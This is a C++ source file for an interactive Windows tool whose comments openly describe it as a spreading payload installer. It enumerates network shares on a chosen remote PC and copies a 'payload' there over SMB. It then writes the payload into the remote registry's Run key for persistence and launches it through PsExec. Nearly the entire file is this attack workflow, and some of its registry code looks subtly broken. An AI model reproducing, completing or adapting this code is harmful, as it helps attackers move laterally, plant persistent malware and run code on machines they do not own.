
/*
	GNU AFFERO GENERAL PUBLIC LICENSE
        Version 3, 19 November 2007
	Copyrights © Numéro du projet sept sérine.
	author: sérine
*/

// Main Pragma

#pragma once
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <lm.h>
#include <winevt.h>
#include <shellapi.h>
#include "Enumarate.h"
#ifndef UNICODE
#define UNICODE
#endif
#pragma comment(lib, "mpr.lib")

#include <tchar.h>
#include <Winnetwk.h>

#pragma comment(lib, "wevtapi.lib")
#pragma comment(lib, "Shell32.lib")

/*

	ConvertToLPWSTR,
	purpose: Convertion Routine
	TODO: make searate utils class.

*/


LPWSTR ConvertToLPWSTR(
	const std::string& s
	)
{
	LPWSTR ws = new wchar_t[s.size() + 1];
	copy(s.begin(), s.end(), ws);
	ws[s.size()] = 0;
	return ws;
}


/*

	InstallService,
	purpose: Use Remote Registry To install
	Our uploaded payload.
	TODO: Extend The Keys used;
	add More SubKeys for instant 
	Execution, as a sceduled Task,
	On TaskTree\\Chache.

*/


BOOL InstallService(
	string lpIpc,
	string rVal
	) 
{
		LPCWSTR machineName = ConvertToLPWSTR(lpIpc);
		HKEY key_ = NULL;
		// TODO: maybe a runOnce Installler is a better choise.
		std::wstring Root = L"\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";  //OnStartUp
		std::wstring Sub = L"{47744-3337-444873-11221}";
		bool readOnly = false;
		DWORD lastError = 0xfffff;
		DWORD error_;
		long err = ERROR_SUCCESS;

		if ((
			err = RegConnectRegistry(
				machineName,
				HKEY_CURRENT_USER,
				&key_)
			) != ERROR_SUCCESS
		   )
		{
			printf("Error is 0x%x\n", err); // Failed.
			return false;
		}

		DWORD yVal;
		HKEY RemoteKey = NULL;
		error_ = RegCreateKeyEx(
			key_,
			Root.c_str(),
			0,
			NULL,
			REG_OPTION_NON_VOLATILE,
			readOnly ? KEY_READ : KEY_ALL_ACCESS,
			NULL,
			&RemoteKey,
			&yVal
		);

		LPCWSTR value = ConvertToLPWSTR(rVal);

		error_ = RegSetValue(
			RemoteKey,
			Sub.c_str(),
			REG_DWORD,
			value,
			sizeof(DWORD)
		);
		return true;
}


/*

	DisplayStruct,
	purpose: Debugg information || scan networks that
	are possible for spread.
	TODO: delete or save in a tmp file
	for later usage.

*/

void DisplayStruct(
	int i,
	LPNETRESOURCE lpnrLocal
	)
{
	printf("NETRESOURCE[%d] Scope: ", i);
	switch (lpnrLocal->dwScope) {
	case (RESOURCE_CONNECTED):
		printf("connected\n");
		break;
	case (RESOURCE_GLOBALNET):
		printf("all resources\n");
		break;
	case (RESOURCE_REMEMBERED):
		printf("remembered\n");
		break;
	default:
		printf("unknown scope %d\n", lpnrLocal->dwScope);
		break;
	}

	printf("NETRESOURCE[%d] Type: ", i);
	switch (lpnrLocal->dwType) {
	case (RESOURCETYPE_ANY):
		printf("any\n");
		break;
	case (RESOURCETYPE_DISK):
		printf("disk\n");
		break;
	case (RESOURCETYPE_PRINT):
		printf("print\n");
		break;
	default:
		printf("unknown type %d\n", lpnrLocal->dwType);
		break;
	}

	printf("NETRESOURCE[%d] DisplayType: ", i);
	switch (lpnrLocal->dwDisplayType) {
	case (RESOURCEDISPLAYTYPE_GENERIC):
		printf("generic\n");
		break;
	case (RESOURCEDISPLAYTYPE_DOMAIN):
		printf("domain\n");
		break;
	case (RESOURCEDISPLAYTYPE_SERVER):
		printf("server\n");
		break;
	case (RESOURCEDISPLAYTYPE_SHARE):
		printf("share\n");
		break;
	case (RESOURCEDISPLAYTYPE_FILE):
		printf("file\n");
		break;
	case (RESOURCEDISPLAYTYPE_GROUP):
		printf("group\n");
		break;
	case (RESOURCEDISPLAYTYPE_NETWORK):
		printf("network\n");
		break;
	default:
		printf("unknown display type %d\n", lpnrLocal->dwDisplayType);
		break;
	}

	printf("NETRESOURCE[%d] Usage: 0x%x = ", i, lpnrLocal->dwUsage);
	if (lpnrLocal->dwUsage & RESOURCEUSAGE_CONNECTABLE)
		printf("connectable ");
	if (lpnrLocal->dwUsage & RESOURCEUSAGE_CONTAINER)
		printf("container ");
	printf("\n");

	printf("NETRESOURCE[%d] Localname: %S\n", i, lpnrLocal->lpLocalName);
	printf("NETRESOURCE[%d] Remotename: %S\n", i, lpnrLocal->lpRemoteName);
	printf("NETRESOURCE[%d] Comment: %S\n", i, lpnrLocal->lpComment);
	printf("NETRESOURCE[%d] Provider: %S\n", i, lpnrLocal->lpProvider);
	printf("\n");
}

/*

	wConn,
	purpose: Main Method.
	Scan for shares,
	connect to the share,
	copy the payload,
	register the payload,
	Execute remotelly.
	TODO: automate this.

*/

void wConn(
	)
{

	NETRESOURCE resource;
	resource.dwType = RESOURCETYPE_ANY;
	resource.lpLocalName = 0;
	string yl = "\\\\";
	string RemPc;
	cout << "enter RemotePc: ";
	cin >> RemPc;
	yl += RemPc;
	EnumarateShare(ConvertToLPWSTR(yl));
	resource.lpRemoteName = ConvertToLPWSTR(yl);
	resource.lpProvider = 0;
	DWORD conResult;
	DWORD dwResult, dwResultEnum;
	HANDLE hEnum;
	DWORD cbBuffer = 16384;     
	DWORD cEntries = -1;   
	LPNETRESOURCE lpnrLocal;
	DWORD i;
	DWORD result = WNetAddConnection2(
		&resource,
		NULL,
		NULL,
		CONNECT_TEMPORARY
	);
	if (result == NO_ERROR) {
		cout << "Success, connection established to remote host." << endl;
		cout << "Copy Files to target ipc, enter src:";
		string payload;
		cin >> payload;
		LPCTSTR lpPayLoad = ConvertToLPWSTR(payload);
		cout << endl << "enter dst for payload";
		string dst;
		cin >> dst;
		LPCTSTR lpDst = ConvertToLPWSTR(dst);
		BOOL Ret = CopyFileEx(
			lpPayLoad,
			lpDst,
			NULL,
			NULL,
			NULL,
			COPY_FILE_NO_BUFFERING
		);
		if (Ret != NULL) {
			cout << "payload uploaded Successfully." << endl;
			//
			//cout << Ret << endl;
			cout << "installing The Remote Service, insert path" << endl;
			string ServicePath;
			cin >> ServicePath;
			cout << "continue?";
			string jk;
			cin >> jk;
			bool Is = InstallService(yl, ServicePath);
			if (Is) {
				cout << endl << "service installed Seccessfully" << endl;
			}
			else {
				cout << endl << "failed to install The Remote Service" << endl;
				DWORD err = GetLastError();
				cout << err;
			}
			cout << "enter remote execution command";
			string RemAddr;
			cin >> RemAddr;
			LPCTSTR Opt = ConvertToLPWSTR(RemAddr);
			HANDLE rem = ShellExecute(
				(HWND)GetCurrentProcess(),
				L"open",
				L"C:\\Users\\Yn\\Documents\\visual studio 2017\\Projects\\NetUse\\PsExec.exe /c ",
				Opt,
				NULL,
				SW_SHOW
			);
			int kl;
			cin >> kl;
		}
		else {
			cout << "File upload failed." << endl;
			DWORD err = GetLastError();
			cout << err;
			goto EXIT;
		}
		
	}
	cout << result;
EXIT:
	DWORD retval = WNetCancelConnection2(resource.lpRemoteName, 0, TRUE);
	int h;
	cin >> h;

}

/*

	Main,
	purpose: Entry Point.
	TODO: support more protocols.

*/


void main(
	int argc,
	char *argv[],
	char *envp[]
	)
{
	//cout << "enter Method:";
	//string Meth;
	//cin >> Meth;
	/*if (Meth == "Smb") {
		wConn();
		exit(0);
	}*/
	wConn();
	exit(0);
}






